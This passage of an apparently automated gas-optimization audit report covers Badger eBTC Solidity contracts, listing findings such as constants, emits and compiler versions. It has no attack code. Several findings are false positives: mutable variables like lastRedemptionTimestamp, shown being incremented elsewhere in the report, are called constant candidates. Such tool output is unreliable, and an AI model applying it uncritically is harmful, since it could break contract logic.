[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L21](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L21)


#

```
File: contracts/CdpManagerStorage.sol

22    uint128 public constant MINIMUM_GRACE_PERIOD = 15 minutes
```
 `MINIMUM_GRACE_PERIOD` is a public. Consider making it private to save gas.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L22](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L22)


#

```
File: contracts/CdpManagerStorage.sol

122    string public constant NAME = "CdpManager"
```
 `NAME` is a public. Consider making it private to save gas.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L122](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L122)


#

```
File: contracts/CdpManagerStorage.sol

139    uint256 public constant SECONDS_IN_ONE_MINUTE = 60
```
 `SECONDS_IN_ONE_MINUTE` is a public. Consider making it private to save gas.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L139](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L139)


#

```
File: contracts/CdpManagerStorage.sol

141    uint256 public constant MIN_REDEMPTION_FEE_FLOOR = (DECIMAL_PRECISION * 5) / 1000
```
 `MIN_REDEMPTION_FEE_FLOOR` is a public. Consider making it private to save gas.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L141](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L141)


#

```
File: contracts/CdpManagerStorage.sol

149    uint256 public constant MIN_MINUTE_DECAY_FACTOR = 1
```
 `MIN_MINUTE_DECAY_FACTOR` is a public. Consider making it private to save gas.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L149](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L149)


#

```
File: contracts/CdpManagerStorage.sol

150    uint256 public constant MAX_MINUTE_DECAY_FACTOR = 999999999999999999
```
 `MAX_MINUTE_DECAY_FACTOR` is a public. Consider making it private to save gas.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L150](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L150)


#

```
File: contracts/CollSurplusPool.sol

19    string public constant NAME = "CollSurplusPool"
```
 `NAME` is a public. Consider making it private to save gas.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L19](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L19)


#

```
File: contracts/HintHelpers.sol

12    string public constant NAME = "HintHelpers"
```
 `NAME` is a public. Consider making it private to save gas.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L12](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L12)


#

```
File: contracts/PriceFeed.sol

22    string public constant NAME = "PriceFeed"
```
 `NAME` is a public. Consider making it private to save gas.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L22](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L22)


#

```
File: contracts/PriceFeed.sol

32    uint256 public constant TIMEOUT_ETH_BTC_FEED = 4800
```
 `TIMEOUT_ETH_BTC_FEED` is a public. Consider making it private to save gas.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L32](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L32)


#

```
File: contracts/PriceFeed.sol

33    uint256 public constant TIMEOUT_STETH_ETH_FEED = 90000
```
 `TIMEOUT_STETH_ETH_FEED` is a public. Consider making it private to save gas.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L33](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L33)


#

```
File: contracts/PriceFeed.sol

36    uint256 public constant MAX_PRICE_DEVIATION_FROM_PREVIOUS_ROUND = 5e17
```
 `MAX_PRICE_DEVIATION_FROM_PREVIOUS_ROUND` is a public. Consider making it private to save gas.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L36](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L36)


#

```
File: contracts/PriceFeed.sol

42    uint256 public constant MAX_PRICE_DIFFERENCE_BETWEEN_ORACLES = 5e16
```
 `MAX_PRICE_DIFFERENCE_BETWEEN_ORACLES` is a public. Consider making it private to save gas.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L42](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L42)


#

```
File: contracts/SortedCdps.sol

52    string public constant NAME = "SortedCdps"
```
 `NAME` is a public. Consider making it private to save gas.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L52](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L52)


#

```
File: contracts/SortedCdps.sol

80    bytes32 public constant dummyId =
81            0x0000000000000000000000000000000000000000000000000000000000000000
```
 `dummyId` is a public. Consider making it private to save gas.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L80-L81](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L80-L81)


</details>

# 


## [G-12] State variables that could be declared constant
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 20970

### Description
State variables that are not updated following deployment should be declared constant to save gas.

<details>

<summary>
There are 10 instances of this issue:

</summary>

###
#

```
File: contracts/CdpManagerStorage.sol

161    uint256 public baseRate
```
 should be constant 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L161](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L161)


#

```
File: contracts/CdpManagerStorage.sol

159    uint256 public beta = 2
```
 should be constant 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L159](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L159)


#

```
File: contracts/CdpManagerStorage.sol

193    uint256 public lastEBTCDebtErrorRedistribution
```
 should be constant 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L193](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L193)


#

```
File: contracts/CdpManagerStorage.sol

166    uint256 public lastRedemptionTimestamp
```
 should be constant 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L166](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L166)


#

```
File: contracts/CdpManagerStorage.sol

148    uint256 public minuteDecayFactor = 999037758833783000
```
 should be constant 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L148](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L148)


#

```
File: contracts/CdpManagerStorage.sol

142    uint256 public redemptionFeeFloor = MIN_REDEMPTION_FEE_FLOOR
```
 should be constant 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L142](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L142)


#

```
File: contracts/CdpManagerStorage.sol

143    bool public redemptionsPaused
```
 should be constant 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L143](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L143)


#

```
File: contracts/CdpManagerStorage.sol

163    uint256 public stakingRewardSplit
```
 should be constant 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L163](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L163)


#

```
File: contracts/CdpManagerStorage.sol

187    uint256 public systemDebtRedistributionIndex
```
 should be constant 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L187](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L187)


#

```
File: contracts/Governor.sol

17    bytes32 NO_ROLES = bytes32(0)
```
 should be constant 

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L17](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L17)


</details>

# 


## [G-13] Use of emit inside a loop
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 5130

### Description
Emitting an event inside a loop performs a LOG op N times, where N is the loop length. This can lead to significant gas costs.

<details>

<summary>
There are 5 instances of this issue:

</summary>

###
#

```
File: contracts/CdpManagerStorage.sol

300    emit SystemSnapshotsUpdated(_totalStakesSnapshot, _totalCollateralSnapshot)
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L300](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L300)


#

```
File: contracts/CdpManager.sol

220    emit CdpUpdated(
221                    _redeemColFromCdp.cdpId,
222                    ISortedCdps(sortedCdps).getOwnerAddress(_redeemColFromCdp.cdpId),
223                    msg.sender,
224                    _oldDebtAndColl.debt,
225                    _oldDebtAndColl.collShares,
226                    newDebt,
227                    newColl,
228                    Cdps[_redeemColFromCdp.cdpId].stake,
229                    CdpOperation.redeemCollateral
230                )
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L220-L230](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L220-L230)


#

```
File: contracts/LiquidationLibrary.sol

312    emit CdpUpdated(
313                _recoveryState.cdpId,
314                _borrower,
315                msg.sender,
316                _totalDebtToBurn,
317                _totalColToSend,
318                0,
319                0,
320                0,
321                CdpOperation.liquidateInRecoveryMode
322            )
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L312-L322](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L312-L322)


#

```
File: contracts/LiquidationLibrary.sol

281    emit CdpLiquidated(
282                _liqState.cdpId,
283                _borrower,
284                _totalDebtToBurn,
285                // please note this is the collateral share of the liquidated CDP
286                _cappedColPortion,
287                CdpOperation.liquidateInNormalMode,
288                msg.sender,
289                _cappedColl > _debtToColl ? (_cappedColl - _debtToColl) : 0
290            )
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L281-L290](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L281-L290)


#

```
File: contracts/SortedCdps.sol

451    emit NodeRemoved(_ids[i])
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L451](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L451)


</details>

# 


## [G-14] Empty Block
- Severity: Gas Optimization
- Confidence: High

### Description
The code should be refactored such that they no longer exist, or the block should do something useful, such as emitting an event or reverting. If the contract is meant to be extended, the contract should be abstract and the function signatures be added without any default implementation. If the block is an empty if-statement block to avoid doing subsequent checks in the else-if/else conditions, the else-if/else conditions should be nested under the negation of the if-statement, because they involve different classes of checks, which may lead to the introduction of errors when the code is later modified.

<details>

<summary>
There are 2 instances of this issue:

</summary>

###
#

```
File: contracts/PriceFeed.sol

588    try fallbackCaller.getFallbackResponse() returns (
589                    uint256 answer,
590                    uint256 timestampRetrieved,
591                    bool success
592                ) {
593                    fallbackResponse.answer = answer;
594                    fallbackResponse.timestamp = timestampRetrieved;
595                    fallbackResponse.success = success;
596                } catch {
597                    // If call to Fallback reverts, return a zero response with success = false
598                }
```
  contains an empty block.
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L588-L598](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L588-L598)


#

```
File: contracts/PriceFeed.sol

587    if (address(fallbackCaller) != address(0)) {
588                try fallbackCaller.getFallbackResponse() returns (
589                    uint256 answer,
590                    uint256 timestampRetrieved,
591                    bool success
592                ) {
593                    fallbackResponse.answer = answer;
594                    fallbackResponse.timestamp = timestampRetrieved;
595                    fallbackResponse.success = success;
596                } catch {
597                    // If call to Fallback reverts, return a zero response with success = false
598                }
599            }
```
  contains an empty block.
[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L587-L599](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L587-L599)


</details>

# 


## [G-15] Identical Deployments Should be Replaced with Clone
- Severity: Gas Optimization
- Confidence: High

### Description
Detects instances where the same contract is deployed multiple times. Such cases might benefit from the clone factory pattern (EIP-1167), which can significantly reduce deployment gas costs.

<details>

<summary>
There are 1 instances of this issue:

</summary>

###
#
    - LeverageMacroReference is deployed in multiple functions:

```
File: contracts/LeverageMacroFactory.sol

44    address addy = address(
45                new LeverageMacroReference(
46                    borrowerOperations,
47                    activePool,
48                    cdpManager,
49                    ebtcToken,
50                    stETH,
51                    sortedCdps,
52                    _owner
53                )
54            )
```

```
File: contracts/LeverageMacroFactory.sol

44    address addy = address(
45                new LeverageMacroReference(
46                    borrowerOperations,
47                    activePool,
48                    cdpManager,
49                    ebtcToken,
50                    stETH,
51                    sortedCdps,
52                    _owner
53                )
54            )
```

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroFactory.sol#L44-L54](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroFactory.sol#L44-L54)


</details>

# 


## [G-16] Use a More Recent Version of Solidity
- Severity: Gas Optimization
- Confidence: High

### Description

`solc` frequently releases new compiler versions. Using an old version prevents access to new Solidity security checks.
Addition new version gain some gas boost.
We also recommend avoiding complex `pragma` statement.

<details>

<summary>
There are 34 instances of this issue:

</summary>

###
#

```
File: contracts/ActivePool.sol

3    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L3](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/ActivePool.sol#L3)


#

```
File: contracts/BorrowerOperations.sol

3    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L3](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/BorrowerOperations.sol#L3)


#

```
File: contracts/CdpManager.sol

3    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L3](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L3)


#

```
File: contracts/CdpManagerStorage.sol

3    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L3](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L3)


#

```
File: contracts/CollSurplusPool.sol

3    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L3](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CollSurplusPool.sol#L3)


#

```
File: contracts/EBTCToken.sol

3    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L3](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/EBTCToken.sol#L3)


#

```
File: contracts/Governor.sol

2    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L2](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Governor.sol#L2)


#

```
File: contracts/HintHelpers.sol

3    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L3](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/HintHelpers.sol#L3)


#

```
File: contracts/Interfaces/IActivePool.sol

3    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IActivePool.sol#L3](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IActivePool.sol#L3)


#

```
File: contracts/Interfaces/IBorrowerOperations.sol

3    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IBorrowerOperations.sol#L3](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IBorrowerOperations.sol#L3)


#

```
File: contracts/Interfaces/ICdpManager.sol

3    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/ICdpManager.sol#L3](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/ICdpManager.sol#L3)


#

```
File: contracts/Interfaces/ICdpManagerData.sol

3    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/ICdpManagerData.sol#L3](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/ICdpManagerData.sol#L3)


#

```
File: contracts/Interfaces/ICollSurplusPool.sol

3    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/ICollSurplusPool.sol#L3](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/ICollSurplusPool.sol#L3)


#

```
File: contracts/Interfaces/IEBTCToken.sol

3    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IEBTCToken.sol#L3](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IEBTCToken.sol#L3)


#

```
File: contracts/Interfaces/IERC3156FlashBorrower.sol

3    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IERC3156FlashBorrower.sol#L3](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IERC3156FlashBorrower.sol#L3)


#

```
File: contracts/Interfaces/IERC3156FlashLender.sol

3    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IERC3156FlashLender.sol#L3](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IERC3156FlashLender.sol#L3)


#

```
File: contracts/Interfaces/IEbtcBase.sol

3    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IEbtcBase.sol#L3](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IEbtcBase.sol#L3)


#

```
File: contracts/Interfaces/IFallbackCaller.sol

3    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IFallbackCaller.sol#L3](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IFallbackCaller.sol#L3)


#

```
File: contracts/Interfaces/IPermitNonce.sol

3    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IPermitNonce.sol#L3](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IPermitNonce.sol#L3)


#

```
File: contracts/Interfaces/IPool.sol

3    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IPool.sol#L3](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IPool.sol#L3)


#

```
File: contracts/Interfaces/IPositionManagers.sol

3    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IPositionManagers.sol#L3](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IPositionManagers.sol#L3)


#

```
File: contracts/Interfaces/IPriceFeed.sol

3    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IPriceFeed.sol#L3](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IPriceFeed.sol#L3)


#

```
File: contracts/Interfaces/IRecoveryModeGracePeriod.sol

2    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IRecoveryModeGracePeriod.sol#L2](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/IRecoveryModeGracePeriod.sol#L2)


#

```
File: contracts/Interfaces/ISortedCdps.sol

3    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/ISortedCdps.sol#L3](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/Interfaces/ISortedCdps.sol#L3)


#

```
File: contracts/LeverageMacroBase.sol

2    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L2](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroBase.sol#L2)


#

```
File: contracts/LeverageMacroDelegateTarget.sol

2    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroDelegateTarget.sol#L2](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroDelegateTarget.sol#L2)


#

```
File: contracts/LeverageMacroFactory.sol

2    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroFactory.sol#L2](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroFactory.sol#L2)


#

```
File: contracts/LeverageMacroReference.sol

2    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroReference.sol#L2](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LeverageMacroReference.sol#L2)


#

```
File: contracts/LiquidationLibrary.sol

3    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L3](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L3)


#

```
File: contracts/PriceFeed.sol

3    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L3](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/PriceFeed.sol#L3)


#

```
File: contracts/SimplifiedDiamondLike.sol

2    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L2](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SimplifiedDiamondLike.sol#L2)


#

```
File: contracts/SortedCdps.sol

3    pragma solidity 0.8.17;
```
 instead use `0.8.19`

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L3](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/SortedCdps.sol#L3)


#
solc-0.8.17 is not recommended for deployment

#
solc-0.4.26 is not recommended for deployment

</details>

# 


## [G-17] Inefficient assignments to state variables
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 113

### Description
Assignment operations that involve calculations, like add-assigment (`+=`), for state variables, should be replaced with the appropriate calculation operation, like add (`+`), followed by an assignment operation (`=`), to save gas. Avoids a `Gwarmaccess` (100 gas).

<details>

<summary>
There are 1 instances of this issue:

</summary>

###
#

```
File: contracts/CdpManager.sol

697    lastRedemptionTimestamp += _minutesPassedSinceLastRedemption() * SECONDS_IN_ONE_MINUTE
```
 should use the appropriate calculation operation (`+`), followed by an assignment operation (`=`)

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L697](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L697)


</details>

# 


## [G-18] Greater or Equal Comparison Costs Less Gas than Greater Comparison
- Severity: Gas Optimization
- Confidence: High
- Total Gas Saved: 27

### Description
In Solidity, the >= operator costs less gas than the > operator. This is because the Solidity compiler uses the LT opcode for >= comparisons, which requires less gas than the combination of GT and ISZERO opcodes used for > comparisons. Therefore, replacing > with >= when possible can reduce the gas cost of your contract.

<details>

<summary>
There are 9 instances of this issue:

</summary>

###
#

```
File: contracts/CdpManager.sol

690    uint256 timePassed = block.timestamp > lastRedemptionTimestamp
691                ? block.timestamp - lastRedemptionTimestamp
692                : 0
```
 using GREATER_EQUAL/LESS_EQUAL in this case is identical therefore should be use.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L690-L692](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManager.sol#L690-L692)


#

```
File: contracts/CdpManagerStorage.sol

99    newTCR < CCR
```
 using GREATER_EQUAL/LESS_EQUAL in this case is identical therefore should be use.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L99](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/CdpManagerStorage.sol#L99)


#

```
File: contracts/LiquidationLibrary.sol

100    bool _recoveryModeAtStart = _TCR < CCR ? true : false
```
 using GREATER_EQUAL/LESS_EQUAL in this case is identical therefore should be use.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L100](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L100)


#

```
File: contracts/LiquidationLibrary.sol

358    _recoveryState.entireSystemDebt = _recoveryState.entireSystemDebt > _totalDebtToBurn
359                ? _recoveryState.entireSystemDebt - _totalDebtToBurn
360                : 0
```
 using GREATER_EQUAL/LESS_EQUAL in this case is identical therefore should be use.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L358-L360](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L358-L360)


#

```
File: contracts/LiquidationLibrary.sol

361    _recoveryState.entireSystemColl = _recoveryState.entireSystemColl > _totalColToSend
362                ? _recoveryState.entireSystemColl - _totalColToSend
363                : 0
```
 using GREATER_EQUAL/LESS_EQUAL in this case is identical therefore should be use.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L361-L363](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L361-L363)


#

```
File: contracts/LiquidationLibrary.sol

594    debtToRedistribute = _debtToRepay < _totalDebtToBurn
595                    ? _totalDebtToBurn - _debtToRepay //  Bad Debt (to be redistributed) is (CdpDebt - Repaid)
596                    : 0
```
 using GREATER_EQUAL/LESS_EQUAL in this case is identical therefore should be use.

[https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L594-L596](https://github.com/code-423n4/2023-10-badger/blob/main/packages/contracts/contracts/LiquidationLibrary.sol#L594-L596)


#

```
File: contracts/LiquidationLibrary.sol

602    toLiquidator = toLiquidator < _totalColToSend ? toLiquidator : _totalColToSend
```
 using GREATER_EQUAL/LESS_EQUAL in this case is identical therefore should be use.

